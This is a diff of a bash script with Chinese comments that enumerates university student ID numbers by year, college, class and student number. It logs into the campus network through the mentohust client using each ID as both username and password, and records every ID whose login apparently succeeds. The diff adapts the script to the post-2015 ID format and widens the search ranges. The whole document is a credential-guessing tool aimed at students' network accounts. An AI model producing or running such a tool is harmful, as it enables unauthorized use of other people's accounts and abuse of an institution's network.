@@ -1,46 +1,56 @@
 #!/bin/bash
+#2015年之后学校的本科生账号修改了，不是按照原来的规则
+#例如2015生命学院某同学学号：2015 1504 04 09 ，分别是年级，专业，班级和学生号
+#与之前相比，没有了表示本科或者硕士的标号，变成了4位数，还不知道有什么规律
+
 
 #结果保存的文件
-RESULT=sunet
-RESULTx=sunetx
+RESULT=result.re
+RESULTx=resultx.re
 #连接产生的记录文件
-
-tempfile=mentemp
-logfile=menlog.log 
+tempfile=mentemp.tmp
+logfile=menlog.log
 #年级
 stunum1=2015
 #学院
-stunum2=3801
+stunum2=1000
 #班级
 stunum3=01
 #班级里的学号
 stunum4=01
 #学校中的最大专业数(3代表本科后面的150才是数量, before 2015)
-MAX_SUB=3950
+MAX_SUB=3999
 #专业中的最大班级数
-MAX_CLASS=20
+MAX_CLASS=30
 #班里的最大学生数
-MAX_STU=50
+MAX_STU=80
 #mentohust connect time
 DELAY=8
 number=
 #检查多少个学生不存在后跳过这个班级
 cheaknum=5
 #检查多少个班级都没有学生后跳过这专业
-cheakcnum=2
+cheakcnum=4
 #xueyuan
+
+
+function connect() {
+	sudo mentohust -u$number -p$number -l1 -b0 -t$DELAY > $tempfile
+	#sleep $DELAY
+	sudo mentohust -k >/dev/null 2>&1
+	echo `date` >> $logfile
+	echo "sudo mentohust -u$number -p$number -l1 -b0 -t$DELAY" >> $logfile
+	cat $tempfile >> $logfile
+	sleep 8
+	sudo mentohust -k >/dev/null
+	info=`grep "提示" $tempfile | tail -1`
+	echo $info
+}
 
 	function checkNumber(){
 		echo $number	
-		#check 
-		sudo mentohust -u$number -p$number -l1 -b0 -t$DELAY > $tempfile
-		#sleep $DELAY
-		sudo mentohust -k >/dev/null 2>&1
-		echo `date` >> $logfile
-		echo "sudo mentohust -u$number -p$number -l1 -b0 -t$DELAY" >> $logfile
-		cat $tempfile >> $logfile
-		#cat /tmp/mentohust.log >> $tempfile
-		info=`grep "提示" $tempfile | tail -1`
+		#connect 
+		info=`connect` 
 		echo $info | grep "在线用户数量上限" 
 		if [ $? -eq 0 ] ;then
 		echo $number >>$RESULT
@@ -129,7 +139,7 @@ done
         cheakctemp=0
 	stunum4=01
 	stunum3=01
-	stunum2=`expr $stunum2 + 1`
+	stunum2=`expr $stunum2 + 100`
 	echo "跳过当前专业！"   
 	fi #end cheakctemp
 	#sleep 3
